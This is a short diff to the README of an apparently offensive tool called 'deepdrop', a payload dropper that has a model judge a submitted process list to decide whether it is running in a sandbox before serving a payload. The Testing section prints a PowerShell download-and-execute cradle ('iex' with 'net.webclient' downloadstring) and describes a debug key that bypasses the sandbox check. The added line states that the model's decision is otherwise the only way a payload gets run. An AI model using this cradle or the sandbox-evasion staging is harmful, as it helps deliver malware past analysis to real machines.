@@ -29,7 +29,7 @@ core
 ### Quick start
 ```
 λ pip3 install requirements
-λ python3 deepdrop.py
+λ python3 deepdrop.py -d
 
  ____              ____
 |    \ ___ ___ ___|    \ ___ ___ ___
@@ -49,7 +49,7 @@ core
 ```
 
 ### Testing
-Passing `-d\--debug` to deepdrop will give back a key that can be used to bypass the sandbox check for testing payloads. `powershell.exe -c "iex (new-object net.webclient).downloadstring('http://localhost/ece9d57d-ef30-47ed-accb-46ea3c436257')"`
+Passing `-d\--debug` to deepdrop will give back a key that can be used to bypass the sandbox check for testing payloads. `powershell.exe -c "iex (new-object net.webclient).downloadstring('http://localhost/ece9d57d-ef30-47ed-accb-46ea3c436257')"`. Otherwise, submitting a process list and getting a decision from the model is the only way to get a payload executed.
 
 ### Staging 
 Currently only powershell staging is implemented.
